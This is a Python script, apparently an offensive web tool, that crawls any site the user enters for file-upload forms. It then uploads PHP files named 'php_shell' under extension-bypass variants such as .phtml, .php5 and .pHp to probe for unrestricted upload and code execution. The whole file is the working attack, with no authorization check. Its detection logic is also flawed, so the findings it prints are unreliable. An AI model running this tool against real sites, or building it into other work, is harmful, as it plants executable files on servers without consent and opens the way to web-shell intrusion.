import requests
from bs4 import BeautifulSoup
import urllib.parse
import mimetypes

class FileUploadCrawler:
    def __init__(self, base_url):
        self.base_url = base_url
        self.file_upload_pages = set()

    def crawl_and_scan(self, url=None, visited=None):
        if url is None:
            url = self.base_url
        if visited is None:
            visited = set()

        if url in visited:
            return

        visited.add(url)

        try:
            response = requests.get(url)
            if response.status_code == 200:
                soup = BeautifulSoup(response.content, 'html.parser')
                forms = soup.find_all('form')

                for form in forms:
                    if form.find('input', {'type': 'file'}):
                        self.file_upload_pages.add(url)
                        break

                links = soup.find_all('a', href=True)
                for link in links:
                    href = urllib.parse.urljoin(url, link['href'])
                    if href.startswith(self.base_url):
                        self.crawl_and_scan(href, visited)
        except Exception as e:
            print(f"Error accessing {url}: {e}")

    def get_file_upload_pages(self):
        return self.file_upload_pages

class FileUploadTester:
    def __init__(self, url):
        self.url = url

    def test_file_upload(self, form_action):
        files_to_test = {
            'php_shell.php': '<?php echo "Shell"; ?>',
            'php_shell.phtml': '<?php echo "Shell"; ?>',
            'php_shell.php3': '<?php echo "Shell"; ?>',
            'php_shell.php4': '<?php echo "Shell"; ?>',
            'php_shell.php5': '<?php echo "Shell"; ?>',
            'php_shell.php6': '<?php echo "Shell"; ?>',
            'php_shell.pht': '<?php echo "Shell"; ?>',
            'php_shell.pHp': '<?php echo "Shell"; ?>',
            'php_shell.PhP': '<?php echo "Shell"; ?>',
        }

        for filename, content in files_to_test.items():
            boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
            data = (
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
                f'Content-Type: {mimetypes.guess_type(filename)[0] or "application/octet-stream"}\r\n\r\n'
                f'{content}\r\n'
                f'--{boundary}--\r\n'
            ).encode('utf-8')

            headers = {
                'Content-Type': f'multipart/form-data; boundary={boundary}'
            }

            request = requests.post(form_action, data=data, headers=headers)
            if "Shell" in request.text:
                print(f"Vulnerability found: {filename} uploaded and executed on {self.url}")

def print_banner():
    banner = """
███████╗██╗██╗     ███████╗██╗   ██╗ ██████╗██████╗  █████╗ ██╗    ██╗██╗     
██╔════╝██║██║     ██╔════╝██║   ██║██╔════╝██╔══██╗██╔══██╗██║    ██║██║     
█████╗  ██║██║     █████╗  ██║   ██║██║     ██████╔╝███████║██║ █╗ ██║██║     
██╔══╝  ██║██║     ██╔══╝  ██║   ██║██║     ██╔══██╗██╔══██║██║███╗██║██║     
██║     ██║███████╗███████╗╚██████╔╝╚██████╗██║  ██║██║  ██║╚███╔███╔╝███████╗
╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝
                                                                               
                                           
  \033[92mTool by Miftaul Amin\033[0m
"""
    print(banner)

if __name__ == "__main__":
    print_banner()

    base_url = input("Enter the base URL to start crawling: ").strip()
    if not base_url.startswith(("http://", "https://")):
        base_url = "https://" + base_url

    crawler = FileUploadCrawler(base_url)
    crawler.crawl_and_scan()

    file_upload_pages = crawler.get_file_upload_pages()
    if file_upload_pages:
        print("\nFile upload forms found on the following pages:")
        for page in file_upload_pages:
            print(page)
            tester = FileUploadTester(page)
            for form_action in file_upload_pages:
                tester.test_file_upload(form_action)
    else:
        print("\nNo file upload forms found on the website.")
